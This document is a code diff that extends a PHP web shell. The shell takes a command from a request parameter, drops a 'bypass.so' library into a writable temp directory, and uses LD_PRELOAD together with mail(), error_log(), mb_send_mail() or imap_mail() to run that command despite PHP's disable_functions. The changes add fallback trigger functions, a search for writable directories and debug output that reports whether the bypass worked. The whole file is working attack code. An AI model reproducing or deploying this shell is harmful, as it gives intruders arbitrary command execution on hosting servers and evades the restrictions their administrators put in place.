@@ -1,8 +1,33 @@
 <?php
+error_reporting(E_ALL);
 
 $cmd = $_REQUEST["cmd"];
-$outPath = sys_get_temp_dir() . '/' . 'maillogs';
-$soPath = sys_get_temp_dir() . '/' . 'bypass.so';
+
+// Find a writable directory
+function find_writable_dir() {
+    $dirs = array(
+        sys_get_temp_dir(),
+        '/tmp',
+        '/var/tmp',
+        '/dev/shm',
+        dirname(__FILE__),
+        getcwd()
+    );
+    foreach ($dirs as $dir) {
+        if (is_dir($dir) && is_writable($dir)) {
+            return $dir;
+        }
+    }
+    return false;
+}
+
+$tmpDir = find_writable_dir();
+if ($tmpDir === false) {
+    die("ERROR: No writable directory found!");
+}
+
+$outPath = $tmpDir . '/' . 'maillogs';
+$soPath = $tmpDir . '/' . 'bypass.so';
 
 if (!isset($_REQUEST['cmd'])) {
     echo '<!DOCTYPE html>
@@ -45,6 +70,26 @@ window.setInterval("reinitIframe()", 200);
     die();
 }
 
+// Trigger function for LD_PRELOAD - try multiple functions
+function trigger_preload() {
+    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
+    
+    if (function_exists('mail') && !in_array('mail', $disabled)) {
+        mail('', '', '', '');
+        return 'mail';
+    } elseif (function_exists('error_log') && !in_array('error_log', $disabled)) {
+        error_log('', 1, '', '');
+        return 'error_log';
+    } elseif (function_exists('mb_send_mail') && !in_array('mb_send_mail', $disabled)) {
+        mb_send_mail('', '', '');
+        return 'mb_send_mail';
+    } elseif (function_exists('imap_mail') && !in_array('imap_mail', $disabled)) {
+        imap_mail('', '', '');
+        return 'imap_mail';
+    }
+    return false;
+}
+
 function is_64bit()
 {
     $int = "9223372036854775807";
@@ -76,35 +121,43 @@ function release86()
 }
 
 if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+    echo "<p><b>Debug:</b> tmpDir=$tmpDir | arch=" . (is_64bit() ? '64bit' : '32bit') . "</p>";
+    
     if (is_64bit()) {
         release64();
-
-        $evil_cmdline = $cmd . " > " . $outPath . " 2>&1";
-        // echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
-
-        putenv("EVIL_CMDLINE=" . $evil_cmdline);
-        putenv("LD_PRELOAD=" . $soPath);
-        mail("", "", "", "");
-
-        echo "<p style='color: blue;width: 800px;font:13px Monaco,Consolas;'>" . nl2br(file_get_contents($outPath)) . "</p>";
-
-        unlink($outPath);
-        unlink($soPath);
     } else {
         release86();
-
-        $evil_cmdline = $cmd . " > " . $outPath . " 2>&1";
-        // echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
-
-        putenv("EVIL_CMDLINE=" . $evil_cmdline);
-        putenv("LD_PRELOAD=" . $soPath);
-        mail("", "", "", "");
-
-        echo "<p style='color: blue;width: 800px;font:13px Monaco,Consolas;'>" . nl2br(file_get_contents($outPath)) . "</p>";
-
-        unlink($outPath);
-        unlink($soPath);
     }
+    
+    // Verify .so was written
+    if (!file_exists($soPath)) {
+        echo "<p style='color:red;'>ERROR: Failed to write $soPath</p>";
+        echo "<p>is_writable($tmpDir): " . (is_writable($tmpDir) ? 'YES' : 'NO') . "</p>";
+        die();
+    }
+    
+    echo "<p><b>.so written:</b> $soPath (" . filesize($soPath) . " bytes)</p>";
+    
+    $evil_cmdline = $cmd . " > " . $outPath . " 2>&1";
+    
+    putenv("EVIL_CMDLINE=" . $evil_cmdline);
+    putenv("LD_PRELOAD=" . $soPath);
+    $used = trigger_preload();
+    
+    if ($used === false) {
+        echo "<p style='color:red;'>ERROR: No trigger function available</p>";
+        echo "<p>disable_functions: " . ini_get('disable_functions') . "</p>";
+    } else {
+        echo "<p>Triggered via: <b>$used</b></p>";
+        if (file_exists($outPath)) {
+            echo "<p style='color:blue;width:800px;font:13px Monaco,Consolas;'>" . nl2br(file_get_contents($outPath)) . "</p>";
+            @unlink($outPath);
+        } else {
+            echo "<p style='color:orange;'>Output file not created - LD_PRELOAD may not have worked.</p>";
+        }
+    }
+    @unlink($soPath);
 } else {
     echo "Only on Linux";
 }
+
